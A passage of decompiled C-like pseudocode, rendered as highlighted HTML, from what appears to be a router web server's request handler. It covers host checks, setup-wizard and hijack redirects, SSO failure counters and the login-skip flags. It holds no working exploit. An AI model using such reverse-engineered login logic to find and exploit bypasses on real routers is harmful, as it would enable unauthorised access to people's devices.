v42 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">  v43 = v41;</span><br><span class="line">  v44 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v43, v42) )</span><br><span class="line">    v44 = <span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *nvram_get(<span class="string">&quot;http_server_wan_enable&quot;</span>) == <span class="number">49</span> &amp;&amp; *nvram_get(<span class="string">&quot;fw_remote&quot;</span>) == <span class="number">48</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v45 = nvram_get(<span class="string">&quot;wifi_ap_mode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v45 )</span><br><span class="line">      v45 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v45 == <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v44 || (v235 = host, v46 = getIPAddress(<span class="string">&quot;group1&quot;</span>), !<span class="built_in">strcmp</span>(v235, v46)) )</span><br><span class="line">        v44 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !(v44 | is_usb_session) )</span><br><span class="line">    &#123;</span><br><span class="line">      v44 = <span class="number">0</span>;</span><br><span class="line">      nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *nvram_get(<span class="string">&quot;http_server_wan_enable&quot;</span>) == <span class="number">48</span></span><br><span class="line">    &amp;&amp; *nvram_get(<span class="string">&quot;fw_remote&quot;</span>) == <span class="number">49</span></span><br><span class="line">    &amp;&amp; *nvram_get(<span class="string">&quot;config_state&quot;</span>) == <span class="number">115</span></span><br><span class="line">    &amp;&amp; is_usb_session</span><br><span class="line">    &amp;&amp; !v44 )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo drop request usb &gt; /dev/console&quot;</span>);</span><br><span class="line">    v1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_106;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_42C870 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( port == <span class="number">443</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v47 = nvram_get(<span class="string">&quot;http_server_wan_enable&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v47 )</span><br><span class="line">        v47 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( atoi(v47) == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v48 = nvram_get(&amp;unk_416A20);</span><br><span class="line">        <span class="keyword">if</span> ( !v48 )</span><br><span class="line">          v48 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( atoi(v48) == <span class="number">443</span> )</span><br><span class="line">          strlcpy(remote_ip, current_remote_ip, <span class="number">48</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v49 = check_valid_request();</span><br><span class="line">  v17 = <span class="number">403</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v49 )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = <span class="string">&quot;Forbidden&quot;</span>;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v20 = <span class="string">&quot;URL is illegal.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;setupwizard.cgi&quot;</span>) )</span><br><span class="line">    dword_42C9D8 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( dword_42C9D8 == <span class="number">1</span> &amp;&amp; !check_lan_guest() )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo genie from wan, drop request now &gt; /dev/console&quot;</span>);</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_106;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_42C9D8 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/echo it is for setupwizard! &gt;&gt; /tmp/sw.log&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(byte_42C9E0, <span class="string">&quot;/setupwizard.cgi HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">    path = byte_42C9E0;</span><br><span class="line">    <span class="keyword">if</span> ( dword_42C8D4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_42CBE0 = <span class="number">0</span>;</span><br><span class="line">      dword_42CBE4 = <span class="number">0</span>;</span><br><span class="line">      dword_42CBE8 = <span class="number">0</span>;</span><br><span class="line">      dword_42CBEC = <span class="number">0</span>;</span><br><span class="line">      byte_42CBF0 = <span class="number">0</span>;</span><br><span class="line">      v50 = <span class="built_in">strchr</span>(dword_42C8AC, <span class="number">61</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v50 )</span><br><span class="line">        strlcpy(&amp;dword_42CBE0, v50 + <span class="number">1</span>, <span class="number">17</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dnshj.out&quot;</span>, <span class="number">0</span>) &amp;&amp; (!<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) || !<span class="built_in">strncmp</span>(path, <span class="string">&quot;/ &quot;</span>, <span class="number">2u</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      v51 = dword_42B664;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_42B664 )</span><br><span class="line">        v51 = <span class="string">&quot;indexdnshj.htm&quot;</span>;</span><br><span class="line">      <span class="built_in">snprintf</span>(byte_42C9E0, <span class="number">0x200</span>u, <span class="string">&quot;/ca/setup.cgi?next_file=%s HTTP/1.1\r\n&quot;</span>, v51);</span><br><span class="line">      path = byte_42C9E0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/blank_state.out&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v52 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !strcasecmp(v11, v52) )</span><br><span class="line">      &#123;</span><br><span class="line">        v53 = path;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;.htm&quot;</span>) || !<span class="built_in">strncmp</span>(v53, <span class="string">&quot;/ HTTP&quot;</span>, <span class="number">6u</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v235 = host;</span><br><span class="line">          v54 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">          v55 = <span class="built_in">strcmp</span>(v235, v54);</span><br><span class="line">          haystack = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v55 )</span><br><span class="line">            haystack = (<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) != <span class="number">0</span>);</span><br><span class="line">          nvram_get(<span class="string">&quot;tm_action_internet&quot;</span>);</span><br><span class="line">          v56 = path;</span><br><span class="line">          v232 = <span class="built_in">strstr</span>(path, <span class="string">&quot;traffic_status.htm&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !haystack || (v57 = <span class="built_in">strstr</span>(v56, <span class="string">&quot;_h.htm&quot;</span>) != <span class="number">0</span>, access(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>, <span class="number">0</span>)) &amp;&amp; !v57 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(byte_42C9E0, <span class="string">&quot;/ HTTP/1.1\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !v232 )</span><br><span class="line">            &#123;</span><br><span class="line">              v58 = fopen64(<span class="string">&quot;/tmp/blank_state.out&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">              v59 = v58;</span><br><span class="line">              <span class="keyword">if</span> ( v58 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( fgets(v230, <span class="number">99</span>, v58) &amp;&amp; (v60 = <span class="built_in">strstr</span>(v230, <span class="string">&quot;htm&quot;</span>)) != <span class="number">0</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v60[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">                  <span class="built_in">snprintf</span>(byte_42C9E0, <span class="number">0x200</span>u, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1\r\n&quot;</span>, v230);</span><br><span class="line">                  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/tm_block_internet&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">                  &#123;</span><br><span class="line">                    system(<span class="string">&quot;/usr/sbin/rc dnshj stop&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v235 = &amp;loc_410000;</span><br><span class="line">                    <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/tm_already_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v61 = fopen64(v235 + <span class="number">27444</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">                      <span class="keyword">if</span> ( v61 )</span><br><span class="line">                        fclose(v61);</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                  path = byte_42C9E0;</span><br><span class="line">                  dword_42A248 = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v230, <span class="string">&quot;lan_wan_conflict&quot;</span>) &amp;&amp; !haystack )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">snprintf</span>(byte_42C9E0, <span class="number">0x200</span>u, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1\r\n&quot;</span>, <span class="string">&quot;alert.htm&quot;</span>);</span><br><span class="line">                  path = byte_42C9E0;</span><br><span class="line">                &#125;</span><br><span class="line">                fclose(v59);</span><br><span class="line">                dword_42C870 = <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/lan_ip_auto_changed&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_169:</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;settings.jpg&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      system(<span class="string">&quot;/bin/touch /tmp/stop_conflict_warning&quot;</span>);</span><br><span class="line">      unlink(<span class="string">&quot;/tmp/conflict_warning&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v65 = get_uptime(<span class="string">&quot;/tmp/conflict_warning&quot;</span>);</span><br><span class="line">      src = v65;</span><br><span class="line">      v66 = get_uptime(<span class="string">&quot;/proc/uptime&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( HIDWORD(v66) - HIDWORD(v65) != v66 &lt; src || (v66 - src) &gt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/conflict_warning&quot;</span>);</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/lan_ip_auto_changed&quot;</span>);</span><br><span class="line">        unlink(<span class="string">&quot;/tmp/stop_conflict_warning&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/usr/sbin/rc dnshj stop&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v62 = dword_42C8B8;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(dword_42C8B8, <span class="string">&quot;Genie&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v62, <span class="string">&quot;LANWizard&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v63 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !strcasecmp(v11, v63) )</span><br><span class="line">      &#123;</span><br><span class="line">        v64 = path;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(path, <span class="string">&quot;error-tab-rec.htm&quot;</span>)</span><br><span class="line">          &amp;&amp; (<span class="built_in">strstr</span>(v64, <span class="string">&quot;.htm&quot;</span>) || !<span class="built_in">strncmp</span>(v64, <span class="string">&quot;/ HTTP&quot;</span>, <span class="number">6u</span>) || <span class="built_in">strstr</span>(v64, <span class="string">&quot;.aspx&quot;</span>)) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            strlcpy(byte_42C9E0, <span class="string">&quot;/setup.cgi?next_file=BRS_wanlan_conflict.html HTTP/1.1\r\n&quot;</span>, <span class="number">512</span>);</span><br><span class="line">            path = byte_42C9E0;</span><br><span class="line">            system(<span class="string">&quot;/bin/cp /proc/uptime /tmp/conflict_warning&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      dword_42A248 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_169;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/brs_hijack.out&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_235;</span><br><span class="line">  v67 = getIPAddress(<span class="string">&quot;group1&quot;</span>);</span><br><span class="line">  v68 = host;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(host, <span class="string">&quot;www.msftncsi.com&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;ncsi.txt&quot;</span>)</span><br><span class="line">    || !<span class="built_in">strcmp</span>(v68, <span class="string">&quot;www.msftconnecttest.com&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;connecttest.txt&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = <span class="number">404</span>;</span><br><span class="line">    dword_42C88C = <span class="string">&quot;HTTP/1.0&quot;</span>;</span><br><span class="line">    v18 = &amp;unk_415C74;</span><br><span class="line">    v19 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">LABEL_546:</span><br><span class="line">    v20 = <span class="string">&quot;File not found.&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_556;</span><br><span class="line">  &#125;</span><br><span class="line">  v69 = socket(<span class="number">2</span>, <span class="number">3</span>, <span class="number">255</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v69 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> (perror)(<span class="string">&quot;socket creating failed&quot;</span>);</span><br><span class="line">  v71 = nvram_get(<span class="string">&quot;wan_ifname&quot;</span>);</span><br><span class="line">  strlcpy(v229, v71, <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ioctl(v69, <span class="number">0x8915</span>u, v229) )</span><br><span class="line">  &#123;</span><br><span class="line">    v80 = nvram_get(<span class="string">&quot;wifi_ap_mode&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v80 )</span><br><span class="line">      v80 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    v81 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v80 )</span><br><span class="line">    &#123;</span><br><span class="line">      v81 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(host, v67) )</span><br><span class="line">      &#123;</span><br><span class="line">        v82 = nvram_get(<span class="string">&quot;wifi_ap_mode&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v82 )</span><br><span class="line">          v82 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        v81 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( atoi(v82) )</span><br><span class="line">        &#123;</span><br><span class="line">          v83 = host;</span><br><span class="line">          v84 = nvram_get(<span class="string">&quot;wifi_ap_name&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !v84 )</span><br><span class="line">            v84 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">          v81 = strcasestr(v83, v84) != <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v85 = host;</span><br><span class="line">    v86 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">    v87 = v85;</span><br><span class="line">    v78 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v87, v86) &amp;&amp; !<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) )</span><br><span class="line">      v78 = v81;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v72 = inet_ntoa(v229[<span class="number">5</span>]);</span><br><span class="line">    v73 = strdup(v72);</span><br><span class="line">    v74 = host;</span><br><span class="line">    v76 = v73;</span><br><span class="line">    v75 = nvram_get(<span class="string">&quot;lan_ipaddr&quot;</span>);</span><br><span class="line">    v77 = v74;</span><br><span class="line">    v78 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v77, v75) )</span><br><span class="line">    &#123;</span><br><span class="line">      v79 = host;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(host, <span class="string">&quot;routerlogin&quot;</span>) )</span><br><span class="line">        v78 = <span class="built_in">strstr</span>(v79, v76) != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v88 = sub_405EE4(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(v11, v88)</span><br><span class="line">    || (v89 = path, <span class="built_in">strstr</span>(path, <span class="string">&quot;BRS_&quot;</span>))</span><br><span class="line">    || <span class="built_in">strstr</span>(v89, <span class="string">&quot;debug.htm&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v89, <span class="string">&quot;currentsetting&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v89, <span class="string">&quot;POT.htm&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v89, <span class="string">&quot;sso&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>(v89, <span class="string">&quot;POT&quot;</span>)</span><br><span class="line">    || !access(<span class="string">&quot;/tmp/wizard_vlan&quot;</span>, <span class="number">0</span>)</span><br><span class="line">    || !access(<span class="string">&quot;/tmp/conflict_warning&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_233:</span><br><span class="line">    <span class="keyword">if</span> ( !v78 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_234;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_235;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v78 &amp;&amp; !need_fakepath(path) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_235;</span><br><span class="line">  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/brs_gui_hijack&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v78 )</span><br><span class="line">      v95 = <span class="string">&quot;App.html&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v95 = <span class="string">&quot;BRS_hijack_index.htm&quot;</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(byte_42C9E0, <span class="number">0x200</span>u, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1&quot;</span>, v95);</span><br><span class="line">    path = byte_42C9E0;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_233;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v78 )</span><br><span class="line">  &#123;</span><br><span class="line">    v90 = nvram_get(<span class="string">&quot;mandate_sso&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v90 )</span><br><span class="line">      v90 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v90 != <span class="number">49</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_227;</span><br><span class="line">    v91 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v91 )</span><br><span class="line">      v91 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v91 != <span class="number">99</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_227;</span><br><span class="line">    v92 = nvram_get(<span class="string">&quot;sso_first_time&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v92 )</span><br><span class="line">      v92 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v92 != <span class="number">48</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_227;</span><br><span class="line">    v93 = nvram_get(<span class="string">&quot;RAE_ssoGuiRegStatus&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v93 )</span><br><span class="line">      v93 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v93, <span class="string">&quot;InternetNA&quot;</span>) )</span><br><span class="line">      v94 = <span class="string">&quot;BRS_sso_hijack.html&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">LABEL_227:</span><br><span class="line">      v94 = <span class="string">&quot;BRS_hijack_success.htm&quot;</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(byte_42C9E0, <span class="string">&quot;/setup.cgi?next_file=%s HTTP/1.1&quot;</span>, v94);</span><br><span class="line">    path = byte_42C9E0;</span><br><span class="line">LABEL_234:</span><br><span class="line">    dword_42A248 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_235:</span><br><span class="line">  v96 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v96 )</span><br><span class="line">    v96 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v96 == <span class="number">98</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_241;</span><br><span class="line">  v97 = nvram_get(<span class="string">&quot;need_not_login&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v97 )</span><br><span class="line">    v97 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v97 == <span class="number">49</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_241:</span><br><span class="line">    nvram_set(<span class="string">&quot;need_not_login&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    nvram_set(<span class="string">&quot;start_in_blankstate&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( path_exist(path, off_42AEC4, v11) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_250;</span><br><span class="line">  v98 = path;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;htpwd_recovery.cgi&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v99 = sub_405EE4(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(v11, v99) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_250;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v98, <span class="string">&quot;PNPX_GetShareFolderList&quot;</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_250;</span><br><span class="line">  v100 = nvram_get(<span class="string">&quot;config_state&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v100 )</span><br><span class="line">    v100 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *v100 == <span class="number">99</span> &amp;&amp; <span class="built_in">strstr</span>(path, <span class="string">&quot;sso&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_250:</span><br><span class="line">    dword_42C870 = <span class="number">0</span>;</span><br><span class="line">    dword_42A248 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;currentsetting.htm&quot;</span>) )</span><br><span class="line">      dword_42C9D8 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v101 = off_42AEC4;</span><br><span class="line">  v102 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *v101 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, *v101) )</span><br><span class="line">      v102 = <span class="number">1</span>;</span><br><span class="line">    ++v101;</span><br><span class="line">  &#125;</span><br><span class="line">  v103 = path;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;sso.html&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v103, <span class="string">&quot;?token=&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(v103, <span class="string">&quot;?error_code=2200&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v104 = nvram_get(<span class="string">&quot;sso_from_internet&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v104 )</span><br><span class="line">      v104 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v104 == <span class="number">49</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v229[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      LOBYTE(v229[<span class="number">1</span>]) = <span class="number">0</span>;</span><br><span class="line">      v105 = nvram_get(<span class="string">&quot;sso_fail_times&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v105 )</span><br><span class="line">        v105 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      v106 = atoi(v105) + <span class="number">1</span>;</span><br><span class="line">      nvram_set(<span class="string">&quot;RAE_ssoGuiRegStatus&quot;</span>, <span class="string">&quot;Failed&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v106 &lt; <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(v229, <span class="string">&quot;%d&quot;</span>, v106);</span><br><span class="line">        v107 = v229;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        nvram_set(<span class="string">&quot;sso_skip&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        v107 = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      nvram_set(<span class="string">&quot;sso_fail_times&quot;</span>, v107);</span><br><span class="line">      nvram_set(<span class="string">&quot;sso_from_internet&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">      nvram_commit();</span><br><span class="line">      v108 = dword_42C88C;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_42C88C )</span><br><span class="line">        v108 = <span class="string">&quot;HTTP/1.1&quot;</span>;</span><br><span class="line">      dword_42C88C = v108;</span><br><span class="line">      <span class="keyword">if</span> ( v106 &lt; <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        optlen = getpid();</span><br><span class="line">        <span class="keyword">if</span> ( v106 == <span class="number">1</span> )</span><br><span class="line">          <span class="built_in">snprintf</span>(v230, <span class="number">0x64</span>u, <span class="string">&quot;Location: setup.cgi?next_file=%s&amp;timestamp=%d&quot;</span>, <span class="string">&quot;BRS_sso_fail.html&quot;</span>, optlen);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">snprintf</span>(v230, <span class="number">0x64</span>u, <span 